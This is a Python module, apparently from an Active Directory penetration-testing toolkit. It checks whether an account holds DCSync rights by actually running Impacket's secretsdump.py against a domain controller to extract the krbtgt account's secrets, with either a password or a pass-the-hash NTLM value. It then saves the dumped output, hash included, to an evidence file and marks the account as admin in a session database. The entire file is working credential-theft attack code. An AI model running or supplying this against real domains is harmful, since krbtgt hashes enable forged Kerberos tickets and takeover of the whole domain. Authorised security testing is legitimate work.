#!/usr/bin/env python3
import sys
import os
import argparse
import subprocess

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../..')))

from core.database import DatabaseManager, Credential
from core.logger import setup_logger, get_logger

logger = None

def check_dcsync_rights(session_dir, domain, dc_ip, username, password=None, ntlm_hash=None):
    """Check if user has DCSync rights (Replicating Directory Changes permissions)"""
    global logger
    setup_logger("dcsync_check", session_dir)
    logger = get_logger("dcsync_check")
    
    db_path = os.path.join(session_dir, "session.db")
    db = DatabaseManager(db_path)
    
    logger.info(f"Checking DCSync rights for {username} on {domain}")
    
    # Build credential string
    if password:
        cred_string = f"{domain}/{username}:{password}"
        hash_arg = []
    elif ntlm_hash:
        cred_string = f"{domain}/{username}"
        hash_arg = ["-hashes", f":{ntlm_hash}"]
    else:
        logger.error("No credentials provided")
        return
    
    # Method 1: Try to DCSync the krbtgt account (definitive test)
    logger.info("Attempting DCSync of krbtgt account...")
    
    cmd = [
        "secretsdump.py",
        cred_string
    ] + hash_arg + [
        "-just-dc-user", "krbtgt",
        "-target-ip", dc_ip
    ]
    
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=60
        )
        
        if "krbtgt:" in result.stdout and ":::" in result.stdout:
            logger.warning(f"[CRITICAL] {username} has DCSync rights!")
            logger.info("This user can dump the entire domain database remotely")
            
            # Update credential in DB to mark as high-value
            session = db.get_session()
            cred = session.query(Credential).filter_by(
                username=username, domain=domain
            ).first()
            if cred:
                cred.is_admin = True  # Mark as admin if not already
                # Add note about DCSync (would need a notes field)
            session.commit()
            session.close()
            
            # Save evidence
            evidence_file = os.path.join(session_dir, f"dcsync_{username}.txt")
            with open(evidence_file, 'w') as f:
                f.write(f"DCSync Rights Confirmed\n")
                f.write(f"User: {domain}\\{username}\n")
                f.write(f"Target DC: {dc_ip}\n")
                f.write(f"\nEvidence:\n{result.stdout}\n")
            
            logger.info(f"Evidence saved: {evidence_file}")
            return True
        else:
            logger.info(f"{username} does NOT have DCSync rights")
            return False
            
    except subprocess.TimeoutExpired:
        logger.error("DCSync check timed out")
        return False
    except FileNotFoundError:
        logger.error("secretsdump.py not found. Install Impacket.")
        return False
    except Exception as e:
        logger.error(f"DCSync check failed: {e}")
        return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--session-dir", required=True)
    parser.add_argument("--domain", required=True)
    parser.add_argument("--dc-ip", required=True)
    parser.add_argument("--username", required=True)
    parser.add_argument("--password")
    parser.add_argument("--ntlm-hash")
    args = parser.parse_args()
    
    check_dcsync_rights(args.session_dir, args.domain, args.dc_ip,
                       args.username, args.password, args.ntlm_hash)
